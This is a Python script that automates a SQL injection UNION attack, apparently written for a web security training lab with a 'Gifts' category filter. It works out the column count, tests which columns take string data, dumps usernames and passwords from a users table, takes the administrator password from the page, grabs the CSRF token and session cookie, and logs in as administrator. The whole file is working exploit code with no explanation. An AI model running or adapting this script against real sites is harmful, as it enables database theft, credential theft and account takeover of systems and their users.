import requests
import sys

def sendPayload(index, cols, URL):
    print(f"[-] Trying index {index}...")
    nulls = "null,"
    payload = (nulls * cols).split(',')
    payload[index] = "'dummy'"
    payload = ",".join(payload)[:-1]

    response = requests.get(URL + "'+UNION+SELECT+"+ payload + "+--+-+")
    if response.status_code == 200:
        print(f"[+] Index {index} supports string datatype...")
        return 1
    else:
        print(f"[-] Index {index} does not support string datatype...")
        return 0

def findColumns(URL):
    i = 1
    cols = 0
    while True:
        response = requests.get(URL + "'+ORDER+BY+" + str(i) + "+--+-+")
        if response.status_code != 200:
            cols = i - 1
            print(f"[+] No. of columns : {(i -1)}")
            break
        i += 1
    return cols

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

print("[-] Determining number of columns for UNION attack...")
cols = findColumns(URL)

print("[-] Checking if the columns suport string datatype...")
supported = 0
for i in range(cols):
    supported += sendPayload(i, cols, URL)
if supported == cols:
    print("[+] All columns support string datatype...")
    print("[+] We can go on with UNION attack...")

    print("[-] Sending payload for UNION Attack...")
    response = requests.get(URL + "'+UNION+SELECT+username,password+FROM+users+--+-+")
    if "administrator" in response.text:
        print("[+] `Administrator` user found...")
        index = response.text.find("administrator")
        password = response.text[index + len("administrator</th>"):]
        td_start = password.find("<td>")
        td_end = password.find("</td>")
        password = password[td_start + 4 : td_end]
        print(f"[+] `Administrator` password : {password}")

        print("[-] Time to login as `administrator`...")
        print("[-] Getting CSRF token and session cookie...")
        response = requests.get(URL.replace("/filter?category=Gifts","") + "/login")
        csrf = response.text[response.text.find('csrf"') + 13: response.text.find('csrf"') + 13 + 32]
        print(f"[+] CSRF token : {csrf}")
        sess_cookie = response.cookies["session"]
        print(f"[+] Session cookie : {sess_cookie}")
        print("[-] Trying to log in...")
        response = requests.post(URL.replace("/filter?category=Gifts","") + "/login", data={"csrf":csrf, "username":"administrator", "password":password}, headers={"Cookie":"session="+sess_cookie})
        if "Invalid username or password." not in response.text:
            print("[+] Login successful!!!")
        else:
            print("[-] Try Harder!!!")
